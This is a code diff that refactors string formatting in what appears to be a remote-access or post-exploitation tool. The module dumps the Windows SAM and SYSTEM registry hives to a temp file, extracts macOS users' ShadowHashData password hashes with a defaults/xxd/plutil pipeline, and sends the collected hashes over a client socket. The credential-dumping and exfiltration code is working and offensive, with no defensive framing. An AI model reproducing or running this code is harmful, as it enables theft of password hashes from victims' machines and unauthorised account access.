@@ -9,17 +9,13 @@ def windows_hashdump(sam_h,sys_h,hashtmp):
     if not os.path.exists(hashtmp):
         os.mkdir(hashtmp)
 
-    sam = run_command('REG SAVE HKLM\\SAM {}'.format(sam_h))
-    sys = run_command('REG SAVE HKLM\\SYSTEM {}'.format(sys_h))
+    sam = run_command(f'REG SAVE HKLM\\SAM {sam_h}')
+    sys = run_command(f'REG SAVE HKLM\\SYSTEM {sys_h}')
 
     s = 'The operation completed successfully'
     if s in sam and s in sys:
         return "[+] Successfully saved SAM and SYSTEM registry hives.", True
-    else:
-        if s not in sam:
-            return "[!] {}".format(sam), False
-        if s not in sys:
-            return "[!] {}".format(sys), False
+    return (f"[!] {sam}", False) if s not in sam else (f"[!] {sys}", False)
 
 if win_client():
     hashtmp = 'C:\\Windows\\Temp\\ST_9626N.tmp'
@@ -42,10 +38,11 @@ if osx_client():
     users = users.split()
     for u in users:
         if u not in osx_ignore:
-            cmd = 'defaults read "/var/db/dslocal/nodes/Default/users/{}.plist" ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - '.format(u)
+            cmd = f'defaults read "/var/db/dslocal/nodes/Default/users/{u}.plist" ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - '
+
             resp = run_command(cmd)
             if no_error(resp):
-                pw_hashes += 'User: {}\n{}\n\n'.format(u,resp)
+                pw_hashes += f'User: {u}\n{resp}\n\n'
                 success = True
     if success:
         send(client_socket,pw_hashes)
